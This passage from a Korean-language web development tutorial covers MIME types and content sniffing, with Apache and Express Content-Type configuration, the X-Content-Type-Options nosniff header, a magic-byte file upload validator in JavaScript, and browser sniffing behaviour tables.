이 경우 브라우저는 바이트 스니핑을 수행하여
실제 콘텐츠 타입을 결정할 수 있음

이유:
  Apache 버그로 인해 많은 리소스가 잘못된 text/plain으로 제공됨
  사용자 경험을 위해 실제 타입을 감지할 필요가 있음
```

### 10.3 현대 Apache 설정

```apache
# Apache에서 올바른 MIME 타입 설정

# mime.conf 또는 .htaccess
AddType text/html .html .htm
AddType text/css .css
AddType text/javascript .js .mjs
AddType application/json .json
AddType image/png .png
AddType image/jpeg .jpg .jpeg
AddType image/gif .gif
AddType image/svg+xml .svg .svgz
AddType image/webp .webp
AddType font/woff .woff
AddType font/woff2 .woff2
AddType application/pdf .pdf
AddType video/mp4 .mp4
AddType video/webm .webm

# nosniff 헤더 추가
<IfModule mod_headers.c>
    Header always set X-Content-Type-Options "nosniff"
</IfModule>

# 기본 MIME 타입 설정 (인식하지 못하는 확장자)
DefaultType application/octet-stream
```

---

## 11. 실용 예제

### 11.1 파일 업로드 타입 검증

```javascript
// 클라이언트 측 파일 타입 검증 (매직 바이트 기반)
class FileTypeValidator {
    constructor() {
        this.signatures = [
            // [offset, bytes, mime]
            { offset: 0, bytes: [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A], mime: 'image/png' },
            { offset: 0, bytes: [0xFF, 0xD8, 0xFF], mime: 'image/jpeg' },
            { offset: 0, bytes: [0x47, 0x49, 0x46, 0x38], mime: 'image/gif' },
            { offset: 0, bytes: [0x42, 0x4D], mime: 'image/bmp' },
            { offset: 0, bytes: [0x25, 0x50, 0x44, 0x46], mime: 'application/pdf' },
            { offset: 0, bytes: [0x50, 0x4B, 0x03, 0x04], mime: 'application/zip' },
            { offset: 0, bytes: [0x77, 0x4F, 0x46, 0x46], mime: 'font/woff' },
            { offset: 0, bytes: [0x77, 0x4F, 0x46, 0x32], mime: 'font/woff2' },
        ];

        // 복합 시그니처 (여러 위치 확인 필요)
        this.complexSignatures = [
            {
                checks: [
                    { offset: 0, bytes: [0x52, 0x49, 0x46, 0x46] },
                    { offset: 8, bytes: [0x57, 0x45, 0x42, 0x50] }
                ],
                mime: 'image/webp'
            },
            {
                checks: [
                    { offset: 0, bytes: [0x52, 0x49, 0x46, 0x46] },
                    { offset: 8, bytes: [0x57, 0x41, 0x56, 0x45] }
                ],
                mime: 'audio/wav'
            }
        ];
    }

    async validate(file, allowedTypes) {
        const detectedType = await this.detect(file);

        const result = {
            file: file.name,
            fileType: file.type,          // 브라우저가 제공하는 타입
            detectedType: detectedType,    // 매직 바이트로 감지한 타입
            mismatch: file.type !== detectedType,
            allowed: allowedTypes.includes(detectedType)
        };

        if (result.mismatch) {
            console.warn(
                `MIME 타입 불일치: ${file.name} - ` +
                `브라우저: ${file.type}, 감지: ${detectedType}`
            );
        }

        return result;
    }

    async detect(file) {
        const buffer = await file.slice(0, 32).arrayBuffer();
        const bytes = new Uint8Array(buffer);

        // 단순 시그니처 확인
        for (const sig of this.signatures) {
            if (this.matchBytes(bytes, sig.offset, sig.bytes)) {
                return sig.mime;
            }
        }

        // 복합 시그니처 확인
        for (const sig of this.complexSignatures) {
            const allMatch = sig.checks.every(check =>
                this.matchBytes(bytes, check.offset, check.bytes)
            );
            if (allMatch) return sig.mime;
        }

        return 'application/octet-stream';
    }

    matchBytes(data, offset, expected) {
        if (data.length < offset + expected.length) return false;
        return expected.every((byte, i) => data[offset + i] === byte);
    }
}

// 사용 예시
const validator = new FileTypeValidator();
const allowedImages = ['image/png', 'image/jpeg', 'image/gif', 'image/webp'];

document.getElementById('fileInput').addEventListener('change', async (event) => {
    const file = event.target.files[0];
    if (!file) return;

    const result = await validator.validate(file, allowedImages);
    console.log('검증 결과:', result);

    if (!result.allowed) {
        alert(`허용되지 않는 파일 형식입니다. (감지된 타입: ${result.detectedType})`);
        event.target.value = '';
    }
});
```

### 11.2 서버 측 Content-Type 설정

```javascript
// Node.js Express 서버에서의 올바른 Content-Type 설정
const express = require('express');
const path = require('path');

const app = express();

// MIME 타입 매핑
const mimeTypes = {
    '.html': 'text/html; charset=utf-8',
    '.css': 'text/css; charset=utf-8',
    '.js': 'text/javascript; charset=utf-8',
    '.mjs': 'text/javascript; charset=utf-8',
    '.json': 'application/json; charset=utf-8',
    '.png': 'image/png',
    '.jpg': 'image/jpeg',
    '.jpeg': 'image/jpeg',
    '.gif': 'image/gif',
    '.svg': 'image/svg+xml; charset=utf-8',
    '.webp': 'image/webp',
    '.avif': 'image/avif',
    '.ico': 'image/x-icon',
    '.woff': 'font/woff',
    '.woff2': 'font/woff2',
    '.ttf': 'font/ttf',
    '.otf': 'font/otf',
    '.pdf': 'application/pdf',
    '.mp4': 'video/mp4',
    '.webm': 'video/webm',
    '.mp3': 'audio/mpeg',
    '.ogg': 'audio/ogg',
    '.wav': 'audio/wav',
    '.wasm': 'application/wasm',
    '.xml': 'application/xml; charset=utf-8',
    '.zip': 'application/zip',
    '.gz': 'application/gzip',
    '.map': 'application/json'
};

// 정적 파일 제공 시 올바른 Content-Type 설정
app.use(express.static('public', {
    setHeaders: (res, filePath) => {
        const ext = path.extname(filePath).toLowerCase();
        const contentType = mimeTypes[ext];

        if (contentType) {
            res.setHeader('Content-Type', contentType);
        }

        // 보안 헤더
        res.setHeader('X-Content-Type-Options', 'nosniff');
    }
}));
```

### 11.3 Fetch API에서의 MIME 타입 확인

```javascript
// Fetch 응답의 MIME 타입 확인 및 처리
async function fetchWithTypeCheck(url, expectedType) {
    const response = await fetch(url);

    // Content-Type 확인
    const contentType = response.headers.get('Content-Type');
    console.log('서버 Content-Type:', contentType);

    // MIME 타입 파싱
    const mimeType = contentType ? contentType.split(';')[0].trim() : null;

    // 예상 타입과 비교
    if (expectedType && mimeType !== expectedType) {
        console.warn(`MIME 타입 불일치: 예상=${expectedType}, 실제=${mimeType}`);
    }

    // nosniff 확인
    const nosniff = response.headers.get('X-Content-Type-Options');
    if (nosniff === 'nosniff') {
        console.log('nosniff 헤더 존재: MIME 스니핑 비활성화');
    } else {
        console.warn('nosniff 헤더 없음: MIME 스니핑 가능');
    }

    return response;
}

// 사용 예시
const response = await fetchWithTypeCheck('/api/data', 'application/json');
```

---

## 12. 브라우저별 동작

### 12.1 스니핑 동작 차이

| 동작 | Chrome | Firefox | Safari | Edge |
|------|--------|---------|--------|------|
| HTML 스니핑 | 지원 | 지원 | 지원 | 지원 |
| 이미지 스니핑 | 지원 | 지원 | 지원 | 지원 |
| nosniff 지원 | 지원 | 지원 | 지원 | 지원 |
| text/plain 스니핑 | 지원 | 지원 | 지원 | 지원 |
| 오디오/비디오 스니핑 | 지원 | 지원 | 지원 | 지원 |
| 폰트 스니핑 | 지원 | 지원 | 지원 | 지원 |
| JSON 스니핑 | 제한적 | 제한적 | 제한적 | 제한적 |

### 12.2 nosniff 엄격도

```
[nosniff 적용 범위]

Chrome/Edge (Chromium):
├── script 컨텍스트: 엄격 (비JS MIME 차단)
├── style 컨텍스트: 엄격 (비CSS MIME 차단)
├── image 컨텍스트: 경고
├── font 컨텍스트: 경고/차단
└── navigation: 적용 안 됨

Firefox:
├── script 컨텍스트: 엄격
├── style 컨텍스트: 엄격
├── image 컨텍스트: 경고
└── navigation: 적용 안 됨

Safari:
├── script 컨텍스트: 부분 적용
├── style 컨텍스트: 부분 적용
└── 다른 컨텍스트: 제한적
```

---

## 13. 참고 자료

- [MIME Sniffing Standard (WHATWG)](https://mimesniff.spec.whatwg.org/)
- [MDN - MIME types](https://developer.mozilla.org/ko/docs/Web/HTTP/Basics_of_HTTP/MIME_types)
- [MDN - X-Content-Type-Options](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/X-Content-Type-Options)
- [IANA Media Types](https://www.iana.org/assignments/media-types/media-types.xhtml)
- [RFC 2045 - MIME Part One: Format of Internet Message Bodies](https://tools.ietf.org/html/rfc2045)
- [RFC 6838 - Media Type Specifications and Registration Procedures](https://tools.ietf.org/html/rfc6838)
- [file-type (npm package)](https://github.com/sindresorhus/file-type)
